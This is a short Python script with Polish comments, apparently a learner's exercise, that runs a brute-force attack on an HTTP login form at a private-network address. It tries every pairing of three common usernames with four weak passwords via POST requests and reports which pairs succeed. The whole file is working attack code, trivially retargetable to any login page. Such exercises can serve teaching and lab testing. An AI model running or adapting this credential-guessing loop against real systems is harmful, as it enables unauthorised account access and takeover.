"""
atak_brute-force.py
Autor: Mateusz

Opis:
Symulacja prostego ataku typu brute-force na formularz logowania HTTP.
Wysyła żądania POST z listą loginów i haseł.

Wymagania:
- bibloteka requests
"""
import requests
url = ("http://192.168.1.197/login")
# Listy uzytkowników i haseł do przetestowania
uzytkownicy = ["admin", "user", "test"]
hasla = ["1234", "password", "admin","123456"]
# Iterowania po elemntach list(testowanie) 
for uzyt in uzytkownicy:
    for haslo in hasla:
        dane = {"username": uzyt, "password": haslo}
# Próba logowania
        odp = requests.post(url, data=dane)
# Sprawdznaie czy logowanie się powiodło
        if "zalogowano" in odp.text.lower() or odp.status_code == 302:
            print(f"[+] Udało się zalogować: {uzyt}:{haslo}")
        else:
            print(f"[-] Nieudane logowanie: {uzyt}:{haslo}")
